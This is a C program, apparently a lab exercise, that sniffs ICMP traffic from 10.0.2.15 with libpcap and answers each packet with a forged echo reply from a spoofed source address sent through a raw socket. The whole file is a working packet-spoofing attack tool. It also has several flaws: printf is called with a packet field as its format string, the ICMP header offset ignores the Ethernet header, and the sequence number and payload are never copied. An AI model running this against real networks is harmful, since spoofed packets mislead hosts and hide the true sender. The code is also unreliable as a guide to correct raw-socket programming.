#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
 /* Ethernet header */
struct ethheader {
	u_char  ether_dhost[6]; /* destination host address */
	u_char  ether_shost[6]; /* source host address */
	u_short ether_type;                  /* IP? ARP? RARP? etc */
};
/* ICMP Header  */
struct icmpheader {
	unsigned char icmp_type; // ICMP message type
	unsigned char icmp_code; // Error code
	unsigned short int icmp_chksum; //Checksum for ICMP Header and data
	unsigned short int icmp_id;     //Used for identifying request
	unsigned short int icmp_seq;    //Sequence number
};
unsigned short in_cksum(unsigned short *buf, int length)
{
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;

	/*
	* The algorithm uses a 32 bit accumulator (sum), adds
	* sequential 16 bit words to it, and at the end, folds back all
	* the carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* treat the odd byte at the end, if any */
	if (nleft == 1) {
		*(u_char *)(&temp) = *(u_char *)w;
		sum += temp;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16 
	sum += (sum >> 16);                  // add carry 
	return (unsigned short)(~sum);
}
struct ipheader {
	unsigned char      iph_ihl : 4, //IP header length
		iph_ver : 4; //IP version
	unsigned char      iph_tos; //Type of service
	unsigned short int iph_len; //IP Packet length (data + header)
	unsigned short int iph_ident; //Identification
	unsigned short int iph_flag : 3, //Fragmentation flags
		iph_offset : 13; //Flags offset
	unsigned char      iph_ttl; //Time to Live
	unsigned char      iph_protocol; //Protocol type
	unsigned short int iph_chksum; //IP datagram checksum
	struct  in_addr    iph_sourceip; //Source IP address 
	struct  in_addr    iph_destip;   //Destination IP address 
};
void send_raw_ip_packet(struct ipheader* ip)
{
	struct sockaddr_in dest_info;
	int enable = 1;

	// Step 1: Create a raw network socket.
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	// Step 2: Set socket option.
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
		&enable, sizeof(enable));

	// Step 3: Provide needed information about destination.
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	// Step 4: Send the packet out.
	sendto(sock, ip, ntohs(ip->iph_len), 0,
		(struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}
void got_packet(u_char *args, const struct pcap_pkthdr *header,
	const u_char *packet)
{
	struct ethheader *eth = (struct ethheader *)packet;
	struct icmpheader *icm = (struct icmpheader *)(packet+sizeof(struct ipheader));
	if (ntohs(eth->ether_type) == 0x0800) { // 0x0800 is IP type
		struct ipheader * ip = (struct ipheader *)
			(packet + sizeof(struct ethheader));
		if (ip->iph_protocol == IPPROTO_ICMP && strcmp(inet_ntoa(ip->iph_sourceip),"10.0.2.15")==0) {
			char buffer[1500];
			
			memset(buffer, 0, 1500);

			/*********************************************************
			Step 1: Fill in the ICMP header.
			********************************************************/
			struct icmpheader *icmp = (struct icmpheader *)
				(buffer + sizeof(struct ipheader));
			icmp->icmp_type = 0; //ICMP Type: 8 is request, 0 is reply.

								 // Calculate the checksum for integrity
			icmp->icmp_chksum = 0;
			icmp->icmp_id = icm->icmp_id;
			icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
				sizeof(struct icmpheader));

			printf(icmp->icmp_id);
			/*********************************************************
			Step 2: Fill in the IP header.
			********************************************************/
			struct ipheader *ip1 = (struct ipheader *) buffer;
			ip1->iph_ver = 4;
			ip1->iph_ihl = 5;
			ip1->iph_ttl = 20;
			printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));
			ip1->iph_sourceip.s_addr = inet_addr(inet_ntoa(ip->iph_destip));;
			printf("         To: %s\n", inet_ntoa(ip->iph_destip));
			ip1->iph_destip.s_addr = inet_addr("10.0.2.15");

			ip1->iph_protocol = IPPROTO_ICMP;
			
			ip1->iph_len = htons(sizeof(struct ipheader) +
				sizeof(struct icmpheader));

			/*********************************************************
			Step 3: Finally, send the spoofed packet
			********************************************************/
			send_raw_ip_packet(ip1);
			printf("        ICMP SEND!!!!!");
		}

		
	}
}


int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_exp[] = "icmp";
  bpf_u_int32 net;

  // Step 1: Open live pcap session on NIC with name enp0s3
  handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); 

  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net);      
  pcap_setfilter(handle, &fp);                             

  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);                

  pcap_close(handle);   //Close the handle 
  return 0;
}